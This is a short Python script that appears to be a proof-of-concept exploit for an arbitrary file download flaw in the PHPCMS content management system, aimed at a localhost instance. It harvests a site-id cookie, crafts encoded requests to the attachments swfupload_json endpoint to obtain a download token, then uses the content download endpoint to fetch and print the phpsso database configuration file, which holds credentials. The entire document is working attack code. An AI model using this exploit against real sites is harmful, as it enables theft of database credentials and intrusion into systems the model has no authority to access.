import requests
from bs4 import BeautifulSoup


url = "http://localhost:8084/"

cookies = {}

url1 = url + "index.php?m=wap&c=index&a=init"

for c in requests.get(url1).cookies:
    if c.name[-7:] == '_siteid':
        cookie_head = c.name[:6]
        cookies[cookie_head + '_userid'] = c.value
        cookies[c.name] = c.value
        cookies['XDEBUG_SESSION'] = "PHPSTORM"
        print (c.value)


param = "index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=&i=1&m=1&d=1&modelid=2&catid=6&s=./phpcms/modules/content/down.ph&f=p%3%252%2*70C"

url2 = url + "index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f=p%3%25252%2*70C"

file = "./phpsso_server/caches/configs/database.ph"
url2 = url + "index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D" + "{:s}".format(file) + "%26f=p%3%25252%2*70C"

print(url2)

for c in requests.get(url2, cookies=cookies).cookies:
    print(c)
    if c.name[-9:] == '_att_json':
        a_k = c.value

print(a_k)

url3 = url + "index.php?m=content&c=down&a=init&a_k=" + a_k

response = requests.get(url3, cookies=cookies)

soup = BeautifulSoup(response.text, 'html.parser')

#print(type(soup.a.get('href')))

download_url = url + "index.php" + soup.a.get('href')

source = requests.get(download_url, cookies=cookies)

print (source.text)
